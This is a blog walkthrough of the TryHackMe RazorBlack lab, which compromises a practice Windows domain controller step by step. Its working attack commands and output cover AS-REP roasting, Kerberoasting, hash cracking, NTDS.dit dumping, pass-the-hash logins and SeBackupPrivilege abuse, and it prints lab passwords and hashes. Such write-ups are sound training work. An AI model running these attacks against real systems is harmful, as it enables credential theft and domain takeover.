---
title: TryHackMe RazorBlack
date: 2021-07-18T19:31:05+05:30
lastmod: 2021-07-18T19:31:05+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover: /img/blog.png
#cover: /img/thm.gif # for tryhackMe

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm

draft: false
description: TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. read more...

---

## Overview

|RazorBlack||
|---|---|
|[Room](https://tryhackme.com/room/raz0rblack)|![logo](https://tryhackme-images.s3.amazonaws.com/room-icons/5e543ba613749349efa339fbf3aca901.jpeg)|

---

## Task 01

These guys call themselves hackers. Can you show them who's the boss ??

---

## Task 02: Flag Submission Panel

## What is the Domain Name?

* nmap

     ```bash
     sudo nmap -sV -sC -oN nmap/init 10.10.149.120
     # Nmap 7.91 scan initiated Sun Jul 18 19:35:34 2021 as: nmap -sV -sC -oN nmap/init 10.10.149.120
     Nmap scan report for 10.10.149.120
     Host is up (0.15s latency).
     Not shown: 986 closed ports
     PORT     STATE SERVICE       VERSION
     53/tcp   open  domain        Simple DNS Plus
     88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-18 14:05:57Z)
     111/tcp  open  rpcbind       2-4 (RPC #100000)
     | rpcinfo: 
     ...[snip]...
     135/tcp  open  msrpc         Microsoft Windows RPC
     139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
     389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
     445/tcp  open  microsoft-ds?
     464/tcp  open  kpasswd5?
     593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
     636/tcp  open  tcpwrapped
     2049/tcp open  mountd        1-3 (RPC #100005)
     3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
     3269/tcp open  tcpwrapped
     3389/tcp open  ms-wbt-server Microsoft Terminal Services
     | rdp-ntlm-info: 
     |   Target_Name: RAZ0RBLACK
     |   NetBIOS_Domain_Name: RAZ0RBLACK
     |   NetBIOS_Computer_Name: HAVEN-DC
     |   DNS_Domain_Name: raz0rblack.thm
     |   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
     |   Product_Version: 10.0.17763
     |_  System_Time: 2021-07-18T14:06:45+00:00
     | ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
     | Not valid before: 2021-02-22T15:02:37
     |_Not valid after:  2021-08-24T15:02:37
     |_ssl-date: 2021-07-18T14:06:54+00:00; +2s from scanner time.
     Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

     Host script results:
     |_clock-skew: mean: 1s, deviation: 0s, median: 1s
     | smb2-security-mode: 
     |   2.02: 
     |_    Message signing enabled and required
     | smb2-time: 
     |   date: 2021-07-18T14:06:47
     |_  start_date: N/A

     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     # Nmap done at Sun Jul 18 19:38:17 2021 -- 1 IP address (1 host up) scanned in 163.34 seconds

     ```

---

## What is Steven’s Flag?

* SMB

  **SMBMAP**
  
     ```bash
     ┌──(anir0y㉿kali)-[~/share/thm/room/raz0rblack]
     └─$ smbmap -u '' -p '' -H 10.10.149.120                                        2 ⨯
     [+] IP: 10.10.149.120:445       Name: 10.10.149.120 
     ```

* showmount
  
     ```bash
     ┌──(anir0y㉿kali)-[~/share/thm/room/raz0rblack]
     └─$ showmount -e 10.10.149.120      
     Export list for 10.10.149.120:
     /users (everyone)
     ```

* showmount shows us one dir, let's mount it to local machine and continue:

     ```zsh
     # create a mount dir
     $ mkdir smb
     $ sudo mount -t nfs -o vers=2 10.10.149.120:/users ./smb
     $ sudo -i 
     # read the files 
     # ls -l
     total 2
     -rwx------ 1 4294967294 4294967294 9861 Feb 25 21:54 employee_status.xlsx
     -rwx------ 1 4294967294 4294967294   80 Feb 26 01:01 sbradley.txt
     # cat sbradley.txt
     THM{flag-data}
     ```

* there is another file `employee_status.xlsx` let's read the content of this file. in my case I used MS office, you can use any office application.
**Extracted usernames from the xlsx file:**
* content
  
     ```notepad
     daven port
     imogen royce
     tamara vidal
     arthur edwards
     carl ingram
     nolan cassidy
     reza zaydan
     ljudmila vetrova
     rico delgado
     tyson williams
     steven bradley
     chamber lin
     ```

* create a users file based on `employee list`
     I tried with hashcat to create userlist, but turns out format is First letter of `First Name + Last name: i.e. dport for daven port`

     ```bash
     $cat user.lst
     dport
     iroyce
     tvidal
     aedwards
     cingram
     ncassidy
     rzaydan
     lvetrova
     rdelgado
     twilliams
     sbradley
     clin
     ```

* DNS, let's map the domain to IP

     ```bash
     $ cat /etc/hosts
     10.10.149.120   raz0rblack raz0rblack.thm
     ```

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## What is the zip file’s password?

### ASREPRoast

* let's go
  
     ```bash
     $ python3 /opt/impacket/examples/GetNPUsers.py 'raz0rblack.thm/' -usersfile user.lst -no-pass -dc-ip MACHINE_IP -format hashcat -outputfile hashes.asreproast

     Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright 2021 SecureAuth Corporation

     [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
     [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
     [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
     [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
     [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
     [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
     [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
     [-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
     [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
     [-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
     [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)

     # getting the hash
     $ cat hashes.asreproast 

     $krb5asrep$23$twilliams@RAZ0RBLACK.THM:c9a4cd51d976e6b0138462b5f79eaf7b$f932933d4290a95cf38f93c6f87004c025b2a956493479e878e9731b52a7ad63cf89d63113f49c5d97a957448085e403d10c02ca99cf935d9079c293dc26deced316d568d01f221b6c008480011a79c58fb2b89679c765cfdf3e9e73aebe6a61c698ac1e74bc3adb6b8bfa286f72818ddaa8a8b4410643c4088b880ba9543bdbaf4974cde2249be746016f2b0b04c24a46fd85c9536d5f30a57a38f4a8a13a4b4ea554d61d80bd6f93c1cec68ffa263f9e1450e2b3cca940eba1c755518c9411406bd503df48cac7f19f613fe6dfbd3f8ab4e33be309cac8b9edfe5ad961acc0246fd2f98f4fc5f0c15d05c7aa07743c

     #bruteforce
     $ hashcat -m 18200 hashes.asreproast rockyou.txt(relative path is /usr/share/wordlists/rockyou.txt)

     # cracked hash
     hashcat -m 18200 hashes.asreproast --show                          
     $krb5asrep$23$twilliams@RAZ0RBLACK.THM:c9a4cd51d976e6b0138462b5f79eaf7b$f932933d4290a95cf38f93c6f87004c025b2a956493479e878e9731b52a7ad63cf89d63113f49c5d97a957448085e403d10c02ca99cf935d9079c293dc26deced316d568d01f221b6c008480011a79c58fb2b89679c765cfdf3e9e73aebe6a61c698ac1e74bc3adb6b8bfa286f72818ddaa8a8b4410643c4088b880ba9543bdbaf4974cde2249be746016f2b0b04c24a46fd85c9536d5f30a57a38f4a8a13a4b4ea554d61d80bd6f93c1cec68ffa263f9e1450e2b3cca940eba1c755518c9411406bd503df48cac7f19f613fe6dfbd3f8ab4e33be309cac8b9edfe5ad961acc0246fd2f98f4fc5f0c15d05c7aa07743c:roastpotatoes

     ```

* trying loggin in with new creds (SMB)
  
     ```bash
  $ smbmap -H MACHINE_IP -u twilliams -p roastpotatoes
     [+] IP: MACHINE_IP:445        Name: MACHINE_IP
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        trash                                                   NO ACCESS       Files Pending for deletion
     ```

* we can read IPC$, that means we can bruteforce ussernames:

     ```bash
     $ crackmapexec smb $(cat hosts) -u 'twilliams' -p 'roastpotatoes' --rid-brute
     [*] First time use detected
     [*] Creating home directory structure
     [*] Creating default workspace
     [*] Initializing SSH protocol database
     [*] Initializing WINRM protocol database
     [*] Initializing SMB protocol database
     [*] Initializing MSSQL protocol database
     [*] Initializing LDAP protocol database
     [*] Copying default configuration file
     [*] Generating SSL certificate
     SMB         10.10.149.120   445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
     SMB         10.10.149.120   445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
     SMB         10.10.149.120   445    HAVEN-DC         [+] Brute forcing RIDs
     SMB         10.10.149.120   445    HAVEN-DC         498: RAZ0RBLACK\Enterprise Read-only Domain Controllers (SidTypeGroup)                                                                                                
     SMB         10.10.149.120   445    HAVEN-DC         500: RAZ0RBLACK\Administrator (SidTypeUser)
     SMB         10.10.149.120   445    HAVEN-DC         501: RAZ0RBLACK\Guest (SidTypeUser)
     SMB         10.10.149.120   445    HAVEN-DC         502: RAZ0RBLACK\krbtgt (SidTypeUser)
     SMB         10.10.149.120   445    HAVEN-DC         512: RAZ0RBLACK\Domain Admins (SidTypeGroup)
     SMB         10.10.149.120   445    HAVEN-DC         513: RAZ0RBLACK\Domain Users (SidTypeGroup)
     SMB         10.10.149.120   445    HAVEN-DC         514: RAZ0RBLACK\Domain Guests (SidTypeGroup)
     SMB         10.10.149.120   445    HAVEN-DC         515: RAZ0RBLACK\Domain Computers (SidTypeGroup)
     SMB         10.10.149.120   445    HAVEN-DC         516: RAZ0RBLACK\Domain Controllers (SidTypeGroup)
     SMB         10.10.149.120   445    HAVEN-DC         517: RAZ0RBLACK\Cert Publishers (SidTypeAlias)
     SMB         10.10.149.120   445    HAVEN-DC         518: RAZ0RBLACK\Schema Admins (SidTypeGroup)
     SMB         10.10.149.120   445    HAVEN-DC         519: RAZ0RBLACK\Enterprise Admins (SidTypeGroup)
     SMB         10.10.149.120   445    HAVEN-DC         520: RAZ0RBLACK\Group Policy Creator Owners (SidTypeGroup)                                                                                                            
     SMB         10.10.149.120   445    HAVEN-DC         521: RAZ0RBLACK\Read-only Domain Controllers (SidTypeGroup)                                                                                                           
     SMB         10.10.149.120   445    HAVEN-DC         522: RAZ0RBLACK\Cloneable Domain Controllers (SidTypeGroup)                                                                                                           
     SMB         10.10.149.120   445    HAVEN-DC         525: RAZ0RBLACK\Protected Users (SidTypeGroup)
     SMB         10.10.149.120   445    HAVEN-DC         526: RAZ0RBLACK\Key Admins (SidTypeGroup)
     SMB         10.10.149.120   445    HAVEN-DC         527: RAZ0RBLACK\Enterprise Key Admins (SidTypeGroup)
     SMB         10.10.149.120   445    HAVEN-DC         553: RAZ0RBLACK\RAS and IAS Servers (SidTypeAlias)
     SMB         10.10.149.120   445    HAVEN-DC         571: RAZ0RBLACK\Allowed RODC Password Replication Group (SidTypeAlias)                                                                                                
     SMB         10.10.149.120   445    HAVEN-DC         572: RAZ0RBLACK\Denied RODC Password Replication Group(SidTypeAlias)                                                                                                 
     SMB         10.10.149.120   445    HAVEN-DC         1000: RAZ0RBLACK\HAVEN-DC$ (SidTypeUser)
     SMB         10.10.149.120   445    HAVEN-DC         1101: RAZ0RBLACK\DnsAdmins (SidTypeAlias)
     SMB         10.10.149.120   445    HAVEN-DC         1102: RAZ0RBLACK\DnsUpdateProxy (SidTypeGroup)
     SMB         10.10.149.120   445    HAVEN-DC         1106: RAZ0RBLACK\xyan1d3 (SidTypeUser)
     SMB         10.10.149.120   445    HAVEN-DC         1107: RAZ0RBLACK\lvetrova (SidTypeUser)
     SMB         10.10.149.120   445    HAVEN-DC         1108: RAZ0RBLACK\sbradley (SidTypeUser)
     SMB         10.10.149.120   445    HAVEN-DC         1109: RAZ0RBLACK\twilliams (SidTypeUser)
     ```

* new users add them to a file
  
     ```bash
     xyan1d3
     lvetrova
     sbradley
     twilliams
     ```

* Password:
  
     ```bash
     roastpotatoes
     ```

* checking for password reuse:
  
     ```bash
     $ crackmapexec smb $(cat hosts) -u user.lst  -p pass.lst                                             130 ⨯

     SMB         10.10.149.120   445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
     SMB         10.10.149.120   445    HAVEN-DC         [-] raz0rblack.thm\xyan1d3:roastpotatoes STATUS_LOGON_FAILURE 
     SMB         10.10.149.120   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
     SMB         10.10.149.120   445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
     ```

* let's change the password for `sbradley`
  
     ```bash
     $ smbpasswd -r $(cat hosts) -U sbradley                                                                    1 ⨯
     Old SMB password: `roastpotatoes`
     New SMB password: `Passw0rd!`
     Retype new SMB password: `Passw0rd!`
     Password changed for user sbradley #password is set to our password
     ```

* Enumerate SMB with new password:

     ```bash
     smbmap -H MACHINE_IP -u sbradley -p 'Passw0rd!'
     [+] IP: MACHINE_IP:445        Name: MACHINE_IP
          Disk                                                    Permissions     Comment
          ----                                                    -----------     -------
          ADMIN$                                                  NO ACCESS       Remote Admin
          C$                                                      NO ACCESS       Default share
          IPC$                                                    READ ONLY       Remote IPC
          NETLOGON                                                READ ONLY       Logon server share
          SYSVOL                                                  READ ONLY       Logon server share
          trash                                                   READ ONLY       Files Pending for deletion

     root@kali$ smbclient //MACHINE_IP/trash --user='sbradley%Passw0rd!'
     Try "help" to get a list of possible commands.
     smb: \> dir
     .                                   D        0  Tue Mar 16 02:01:28 2021
     ..                                  D        0  Tue Mar 16 02:01:28 2021
     chat_log_20210222143423.txt         A     1340  Thu Feb 25 14:29:05 2021
     experiment_gone_wrong.zip           A 18927164  Tue Mar 16 02:02:20 2021
     sbradley.txt                        A       37  Sat Feb 27 14:24:21 2021

     smb: \> recurse on
     smb: \> prompt off
     smb: \> mget *
     [...]
     ```

* Cracking the zip and looking at contents:

     ```bash
     # convert to hash that john can crack
     root@kali$ zip2john experiment_gone_wrong.zip > hash


     $ john --wordlist=/usr/share/wordlists/rockyou.txt hash
     Using default input encoding: UTF-8
     Loaded 1 password hash (PKZIP [32/64])
     Will run 4 OpenMP threads
     Press 'q' or Ctrl-C to abort, almost any other key for status
     electromagnetismo (experiment_gone_wrong.zip)
     1g 0:00:00:00 DONE (2021-07-16 17:05) 1.408g/s 11803Kp/s 11803Kc/s 11803KC/s elephantmeee..elanore67
     Use the "--show" option to display all of the cracked passwords reliably
     Session completed

     root@kali$ unzip experiment_gone_wrong.zip
     Archive:  experiment_gone_wrong.zip
     [experiment_gone_wrong.zip] system.hive password: electromagnetismo
     inflating: system.hive
     inflating: ntds.dit
     ```

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## What is Ljudmila’s Hash?

* Extract hashes

     ```bash
     python3 /opt/impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL > hashes.txt
     ```

* We need to extract all NTHASHes
  
     ```bash
     cat hashes.txt| cut -d ":" -f 4 > pothashes.txt  
     ```

* After that you need to remove the first few lines, so you only have hashes in there. Then you can bruteforce and get the correct hash:

     ```bash
     crackmapexec smb MACHINE_IP -u lvetrova -H pothashes.txt
     ...[snip]...
     SMB         MACHINE_IP    445    HAVEN-DC         [+] raz0rblack.thm\lvetrova f220d3988deb3f516c73f40ee16c431d
     ```

---

## What is Ljudmila’s Flag?

* Login: (with hash we found earlier)

     ```bash
     evil-winrm -i MACHINE_IP -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
     *Evil-WinRM* PS C:\Users\lvetrova\Documents> whoami
     raz0rblack\lvetrova

     *Evil-WinRM* PS C:\Users\lvetrova\Documents> cd ..

     *Evil-WinRM* PS C:\Users\lvetrova> $Credential = Import-Clixml -Path ".\lvetrova.xml"

     *Evil-WinRM* PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
     THM{flag-data}
     ```

     ![img](https://i.imgur.com/oJ83QKi.png)

---

## What is Xyan1d3’s password?

* Kerberoasting with pass-the-hash with lvetrovas creds:

     ```bash
     python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hashes.kerberoast

     ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
     -------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
     HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 10:17:17.715160  <never>

     root@kali$ hashcat -m 13100 hashes.kerberoast rockyou.txt(relative path: /usr/share/wordlist/rockyou.txt)
     # cracked password: cyanide9amine5628
     ```

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## What is Xyan1d3’s Flag?

* login:

     ```bash
     $ evil-winrm -i MACHINE_IP -u xyan1d3 -p cyanide9amine5628
     *Evil-WinRM* PS C:\Users\xyan1d3\Documents> cd ..
     *Evil-WinRM* PS C:\Users\xyan1d3> $Credential = Import-Clixml -Path "xyan1d3.xml"
     *Evil-WinRM* PS C:\Users\xyan1d3> $Credential.GetNetworkCredential().password
     LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
     ```

---

## What is the root Flag?

* check privileges:
  
     ```bash
     *Evil-WinRM* PS C:\Users\xyan1d3> whoami /all

     [...]

     PRIVILEGES INFORMATION
     ----------------------

     Privilege Name                Description                    State
     ============================= ============================== =======
     SeMachineAccountPrivilege     Add workstations to domain     Enabled
     SeBackupPrivilege             Back up files and directories  Enabled
     SeRestorePrivilege            Restore files and directories  Enabled
     SeShutdownPrivilege           Shut down the system           Enabled
     SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
     SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
     ```

* Abuse Backup Privs (important: diskshadow.txt has a space after each line):

     ```bash
     # create `diskshadow.txt` file content are follwoing
     root@kali$ cat diskshadow.txt
     set metadata C:\tmp\tmp.cabs 
     set context persistent nowriters 
     add volume c: alias someAlias 
     create 
     expose %someAlias% h: 

     *Evil-WinRM* PS C:\Users\xyan1d3> mkdir C:\tmp 
     *Evil-WinRM* PS C:\tmp> upload diskshadow.txt

     *Evil-WinRM* PS C:\tmp> diskshadow.exe /s c:\tmp\diskshadow.txt
     Microsoft DiskShadow version 1.0
     Copyright (C) 2013 Microsoft Corporation
     On computer:  HAVEN-DC,  7/16/2021 3:45:19 PM

     -> set metadata C:\tmp\tmp.cabs
     -> set context persistent nowriters
     -> add volume c: alias someAlias
     -> create
     Alias someAlias for shadow ID {29b531e8-3c00-49f9-925d-5e1e3937af13} set as environment variable.
     Alias VSS_SHADOW_SET for shadow set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6} set as environment variable.

     Querying all shadow copies with the shadow copy set ID {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6}

          * Shadow copy ID = {29b531e8-3c00-49f9-925d-5e1e3937af13}               %someAlias%
                    - Shadow copy set: {2c73aeea-cdb0-47d5-85f8-dfe4dfbdbea6}       %VSS_SHADOW_SET%
                    - Original count of shadow copies = 1
                    - Original volume name: \\?\Volume{115c1f55-0000-0000-0000-602200000000}\ [C:\]
                    - Creation time: 7/16/2021 3:45:20 PM
                    - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                    - Originating machine: HAVEN-DC.raz0rblack.thm
                    - Service machine: HAVEN-DC.raz0rblack.thm
                    - Not exposed
                    - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                    - Attributes:  No_Auto_Release Persistent No_Writers Differential

     Number of shadow copies listed: 1
     -> expose %someAlias% h:
     -> %someAlias% = {29b531e8-3c00-49f9-925d-5e1e3937af13}
     The shadow copy was successfully exposed as h:\.
     ```

     ref:

     - https://coldfusionx.github.io/posts/Blackfield-HTB/
     - http://www.lib4dev.in/info/buftas/Active-Directory-Exploitation-Cheat-Sheet/242721738
  

* Get dll’s to abuse Backup Privs:

     ```bash
     root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll

     root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll

     ```

* Upload, import, abuse:
  
     ```bash
     *Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeUtils.dll

     *Evil-WinRM* PS C:\tmp> upload SeBackupPrivilegeCmdLets.dll

     *Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeUtils.dll

     *Evil-WinRM* PS C:\tmp> import-module .\SeBackupPrivilegeCmdLets.dll

     *Evil-WinRM* PS C:\tmp> copy-filesebackupprivilege h:\windows\ntds\ntds.dit C:\tmp\ntds.dit -overwrite

     *Evil-WinRM* PS C:\tmp> reg save HKLM\SYSTEM C:\tmp\system

     *Evil-WinRM* PS C:\tmp> download ntds.dit

     *Evil-WinRM* PS C:\tmp> download system

     ```

* Dump the hashes:

     ```bash
     root@kali$ python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL
     Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
     Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
     HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::
     krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::
     raz0rblack.thm\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::
     raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::
     raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
     raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
     [*] Kerberos keys from ntds.dit 
     Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf
     Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8
     Administrator:des-cbc-md5:d3b646b65bceb5c7
     HAVEN-DC$:aes256-cts-hmac-sha1-96:d6b41169e02a4543b90a8c697b167948413397c30f1bf5f0199a54f387358fc6
     HAVEN-DC$:aes128-cts-hmac-sha1-96:5ed5bd57484ca826e09afa6e5b944c27
     HAVEN-DC$:des-cbc-md5:f71a0dc89b9d079d
     krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5
     krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb
     krbtgt:des-cbc-md5:857a46f13e91eae3
     raz0rblack.thm\xyan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f
     raz0rblack.thm\xyan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61
     raz0rblack.thm\xyan1d3:des-cbc-md5:e9a1a46223cd8975
     raz0rblack.thm\lvetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39
     raz0rblack.thm\lvetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839
     raz0rblack.thm\lvetrova:des-cbc-md5:385d6e1f1cc17fb6
     raz0rblack.thm\sbradley:aes256-cts-hmac-sha1-96:ddd43169c2235d3d2134fdb2ff4182abdb029a20724e679189a755014e68bab5
     raz0rblack.thm\sbradley:aes128-cts-hmac-sha1-96:7cdf6640a975c86298b9f48000047580
     raz0rblack.thm\sbradley:des-cbc-md5:83fe3e584f4a5bf8
     raz0rblack.thm\twilliams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559
     raz0rblack.thm\twilliams:aes128-cts-hmac-sha1-96:a37656829f443e3fe2630aa69af5cb5a
     raz0rblack.thm\twilliams:des-cbc-md5:01e958b0ea6edf07

     ```

* Get admin flag:

     ```bash
     root@kali$ evil-winrm -i 10.10.2.26 -u administrator -H 9689931bed40ca5a2ce1218210177f0c

     *Evil-WinRM* PS C:\users\administrator\Documents> cd ..

     *Evil-WinRM* PS C:\users\administrator> type root.xml
     <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
     <Obj RefId="0">
     <TN RefId="0">
          <T>System.Management.Automation.PSCredential</T>
          <T>System.Object</T>
     </TN>
     <ToString>System.Management.Automation.PSCredential</ToString>
     <Props>
          <S N="UserName">Administrator</S>
          <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
     </Obj>
     </Objs>

     ```

* Copy the password and convert from hex to get the flag:

     ```zsh
     root@kali$ python3                                                                          
     Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
     [GCC 10.2.1 20210110] on linux
     Type "help", "copyright", "credits" or "license" for more information.

     >>> s = "44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a"

     >>> print(bytes.fromhex(s).decode('ASCII'))
     Damn you are a genius.
     But, I apologize for cheating you like this.

     Here is your Root Flag
     THM{1b4f46cc4fba46348273d18dc91da20d}

     ```

---
<!-- Google Ads -->
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-3526678290068011"
     data-ad-slot="7160066188"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
<!-- END -->

---

## What is Tyson’s Flag?

* As Administrator:

     ```bash
     *Evil-WinRM* PS C:\users\twilliams> type .\definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
     THM{5144f2c4107b7cab04916724e3749fb0}
     ```

---

## What is the complete top secret?

* Enumerate all folders and find top secret path:

     ```bash
